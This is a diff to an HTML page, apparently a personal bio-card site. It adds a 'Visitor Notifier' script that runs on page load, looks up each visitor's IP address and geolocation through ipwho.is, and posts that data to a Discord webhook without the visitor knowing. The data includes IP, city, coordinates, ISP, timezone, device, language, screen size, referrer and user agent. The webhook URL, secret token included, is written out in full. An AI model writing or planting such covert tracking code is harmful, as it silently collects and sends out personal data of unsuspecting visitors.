@@ -199,5 +199,77 @@ var _f=new TextDecoder('utf-8').decode(_e);
   setTimeout(rotate,300);
 })();
 </script>
+
+<!-- ═══ Visitor Notifier ═══ -->
+<script>
+(function(){
+  var WH='https://discord.com/api/webhooks/1484607173945331743/wXRm6FAN3nnYMMR1JDG6AsYmUbybS1i6V7noj425MloyqEvn1PTDZBEW8MizuVj9mf-T';
+
+  function pad(n){return String(n).padStart(2,'0');}
+  function tsNow(){
+    var d=new Date();
+    return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())
+      +' '+pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
+  }
+
+  function send(ip,city,country,cc,isp,lat,lon){
+    var ref=document.referrer||'Direct';
+    var ua=navigator.userAgent;
+    var dev='🖥️ Desktop';
+    if(/Mobi|Android/i.test(ua))dev='📱 Mobile';
+    else if(/Tablet|iPad/i.test(ua))dev='📟 Tablet';
+    var tz=Intl&&Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:'Unknown';
+    var lang=navigator.language||'Unknown';
+    var sw=screen.width+'x'+screen.height;
+    var ts=tsNow();
+
+    var payload={
+      username:'🔔 Bio Card Visitor',
+      avatar_url:'https://cdn.discordapp.com/embed/avatars/0.png',
+      embeds:[{
+        title:'👁️ New Visitor',
+        color:0xd4af37,
+        fields:[
+          {name:'🌐 IP Address',  value:'`'+ip+'`',          inline:true},
+          {name:'🏙️ City',        value:city||'Unknown',      inline:true},
+          {name:'🌍 Country',     value:(cc?':flag_'+cc.toLowerCase()+': ':'')+( country||'Unknown'), inline:true},
+          {name:'🏢 ISP',         value:isp||'Unknown',       inline:true},
+          {name:'📍 Coordinates', value:lat&&lon?lat+', '+lon:'Unknown', inline:true},
+          {name:'🕐 Timezone',    value:tz,                   inline:true},
+          {name:'💻 Device',      value:dev,                  inline:true},
+          {name:'🗣️ Language',    value:lang,                 inline:true},
+          {name:'🖥️ Resolution',  value:sw,                   inline:true},
+          {name:'🔗 Referrer',    value:ref.length>80?ref.slice(0,80)+'…':ref, inline:false},
+          {name:'🌍 URL',         value:'`'+location.href+'`', inline:false},
+          {name:'🖥️ User Agent',  value:'```'+ua.slice(0,200)+'```', inline:false},
+        ],
+        footer:{text:'⏰ '+ts},
+        thumbnail:{url:'https://cdn.discordapp.com/embed/avatars/0.png'}
+      }]
+    };
+
+    fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(function(){});
+  }
+
+  // Fetch visitor IP + geo info then send
+  fetch('https://ipwho.is/')
+    .then(function(r){return r.json();})
+    .then(function(d){
+      send(
+        d.ip||'Unknown',
+        d.city||'',
+        d.country||'',
+        d.country_code||'',
+        d.connection&&d.connection.isp?d.connection.isp:'',
+        d.latitude||'',
+        d.longitude||''
+      );
+    })
+    .catch(function(){
+      // fallback: send without geo
+      send('Unknown','','','','','','');
+    });
+})();
+</script>
 </body>
 </html>
